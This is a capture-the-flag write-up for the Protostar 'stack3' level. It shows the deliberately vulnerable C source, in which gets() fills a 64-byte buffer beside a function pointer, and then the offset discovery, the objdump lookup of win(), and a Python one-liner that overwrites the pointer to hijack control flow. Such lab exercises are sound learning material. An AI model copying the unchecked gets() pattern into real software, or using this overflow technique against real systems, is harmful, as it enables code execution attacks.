### stack3.c
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

### EIP
```txt
root@kali:~/CTF/ctf/protostar# `locate pattern_create` -l 500 > /tmp/pattern.txt
root@kali:~/CTF/ctf/protostar# scp /tmp/pattern.txt user@protostar:/tmp/

user@protostar:/opt/protostar/bin$ ./stack3 < /tmp/pattern.txt 
calling function pointer, jumping to 0x63413163
Segmentation fault

root@kali:~/CTF/ctf/protostar# `locate pattern_offset` -q 63413163
[*] Exact match at offset 64
```

### win function pointer
```txt
user@protostar:/opt/protostar/bin$ objdump -d stack3 | grep win
08048424 <win>:
```


### solution
```txt
user@protostar:/opt/protostar/bin$ python -c 'from struct import pack;print "A"*64 + pack("<I", 0x08048424)' > /tmp/stack3.bin
user@protostar:/opt/protostar/bin$ ./stack3 < /tmp/stack3.bin
calling function pointer, jumping to 0x08048424
code flow successfully changed
```
